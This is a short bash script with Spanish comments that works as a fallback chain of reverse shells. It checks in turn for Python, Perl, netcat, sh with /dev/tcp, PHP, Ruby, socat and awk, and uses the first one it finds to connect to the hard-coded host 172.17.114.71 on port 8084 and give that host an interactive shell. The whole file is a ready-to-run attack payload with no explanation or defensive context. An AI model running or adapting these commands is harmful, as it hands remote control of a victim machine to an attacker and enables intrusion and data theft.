#!/bin/bash

# Reverse shell usando Python
if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("172.17.114.71",8084)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    exit;
fi

# Reverse shell usando Perl
if command -v perl > /dev/null 2>&1; then
    perl -e 'use Socket;$i="172.17.114.71";$p=8084;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    exit;
fi

# Reverse shell usando Netcat (nc)
if command -v nc > /dev/null 2>&1; then
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.114.71 8084 >/tmp/f
    exit;
fi

# Reverse shell usando /bin/sh
if command -v sh > /dev/null 2>&1; then
    /bin/sh -i >& /dev/tcp/172.17.114.71/8084 0>&1
    exit;
fi

# Reverse shell usando PHP
if command -v php > /dev/null 2>&1; then
    php -r '$sock=fsockopen("172.17.114.71",8084);exec("/bin/sh -i <&3 >&3 2>&3");'
    exit;
fi

# Reverse shell usando Ruby
if command -v ruby > /dev/null 2>&1; then
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.17.114.71","8084");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    exit;
fi

# Reverse shell usando Socat
if command -v socat > /dev/null 2>&1; then
    socat tcp-connect:172.17.114.71:8084 exec:"bash -li",pty,stderr,setsid,sigint,sane
    exit;
fi

# Reverse shell usando Awk
if command -v awk > /dev/null 2>&1; then
    awk 'BEGIN {s = "/inet/tcp/0/172.17.114.71/8084"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
    exit;
fi
